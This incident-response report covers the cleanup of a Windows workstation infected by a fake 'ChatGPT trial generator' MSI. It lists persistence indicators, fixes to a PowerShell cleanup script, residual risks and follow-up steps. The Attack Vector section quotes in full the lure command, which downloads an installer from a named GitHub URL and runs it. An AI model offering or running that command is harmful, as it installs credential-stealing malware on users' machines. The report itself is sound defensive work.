# Incident Cleanup Report

## Executive Summary
A targeted cleanup was performed for a Windows workstation compromised by a malicious MSI installer disguised as a "ChatGPT trial generator" service. The payload installed a Deno runtime via WinGet and executed an obfuscated JavaScript loader (`563ca209.js`) through a two-layer persistence chain (Scheduled Task + Registry Run key). The cleanup script (v3) was scoped to the observed indicators and did not attempt broad, indiscriminate removal of unrelated software.

## Attack Vector
The user was directed by a fraudulent YouTube video and a fake GitHub README to run the following command:

```
curl -Lo %temp%\s.msi https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/gpt.msi && msiexec /i %temp%\s.msi
```

This is a social engineering attack. The MSI silently installed a Deno runtime and dropped a persistence chain without any legitimate ChatGPT functionality.

## Observed Indicators
| Artifact | Location | Role |
|---|---|---|
| Scheduled task `\ReaderUpdate` | Task Scheduler | Persistence – launches `Flu_X64.exe` |
| `Flu_X64.exe` | `C:\Users\<profile>\yy.exe\` | Dropper / launcher |
| Registry Run value `563ca209` | `HKCU\...\Run` | Persistence – launches deno.exe |
| `563ca209.js` | `%APPDATA%\563ca209.js` | Obfuscated JS payload |
| `s.msi` | `%TEMP%\s.msi` | Initial dropper installer |
| `yy.exe\` directory | `C:\Users\<profile>\yy.exe\` | Dropper directory |
| Deno runtime | WinGet packages path (`DenoLand.Deno`) | JS execution engine |
| Companion DLLs | Inside `yy.exe\` | `GPUlib.dll`, `HardwareLib.dll`, `Register.dll`, etc. |

## Cleanup Script Changes (v2 → v3)
The following issues were identified and fixed in the cleanup script:

| # | Issue | Fix |
|---|---|---|
| 1 | `[switch]` parameters with `= $true` default — silently broken in PowerShell | Changed to `[bool]` parameters |
| 2 | `-RemoveDenoProduct` switch declared but never wired to any logic | Now correctly gates Deno/WinGet uninstall |
| 3 | Dropper path hardcoded to `Users\Home\yy.exe` | Now dynamically enumerates all user profiles |
| 4 | No Deno WinGet removal | Added `winget uninstall DenoLand.Deno` + WinGet package directory removal |
| 5 | Only HKCU Run key checked | Now also checks HKLM Run and WOW6432Node Run |
| 6 | No Startup folder check | Added scan of per-user and all-users Startup folders |
| 7 | `s.msi` targeted twice (in `$knownNames` and `$tempTargets`) | Removed from `$knownNames`; handled once in Step 6 |
| 8 | `Scan-BrowserArtifacts` used unapproved PowerShell verb | Renamed to `Get-BrowserArtifacts` |

## Remediation Summary
The cleanup script (v3) covers the following actions when run with `-Remediate`:

- Terminates IOC-matching processes (`deno.exe`, `Flu_X64.exe`, etc.)
- Removes scheduled task `\ReaderUpdate`
- Removes Registry Run value `563ca209` from HKCU, HKLM, and WOW6432Node
- Checks per-user Startup folders for IOC-named items
- Hashes and removes known payload files across all discovered user profiles
- Removes the `yy.exe` dropper directory for every profile found
- Removes `%TEMP%\s.msi`
- Attempts MSI uninstall for product `gpt`
- Optionally removes Deno via `winget` and WinGet package directory (`-RemoveDenoProduct`)
- Scans browser profile locations for related artifacts (`-ScanBrowserArtifacts`)
- Produces transcript, actions CSV, and hash CSV for audit

## Residual Risk
The active persistence chain has been removed, but residual risk may still include:

- **Credential/session theft** — the payload had network access via `deno.exe -A` (unrestricted permissions) before cleanup; tokens and passwords exposed in-browser or in environment variables should be considered compromised
- **Browser extension persistence** — a malicious extension may have been installed before cleanup
- **Native messaging host abuse** — the payload may have registered a native messaging host to communicate with a browser extension
- **Secondary or staged payloads** — `563ca209.js` was obfuscated; its full behavior is unknown without dynamic analysis
- **Other user profiles** — if other accounts exist on the machine, their profiles should be checked independently

## Recommended Follow-Up
1. **Rotate all passwords** for email, GitHub, and any account accessed in-browser since the infection
2. **Revoke active sessions and OAuth tokens** for all sensitive services
3. **Audit browser extensions** — remove any unfamiliar extension across all browsers
4. **Check native messaging host JSON files** in `%APPDATA%\Google\Chrome\NativeMessagingHosts\` and equivalent paths
5. **Run Microsoft Defender Full Scan or Offline Scan** to catch any secondary payloads
6. **Review the generated CSV outputs** in `%ProgramData%\IR-Cleanup-<timestamp>\` for a clean forensic trail
7. **Consider dynamic analysis** of the `563ca209.js` file hash (if recorded) using a sandbox such as any.run or VirusTotal
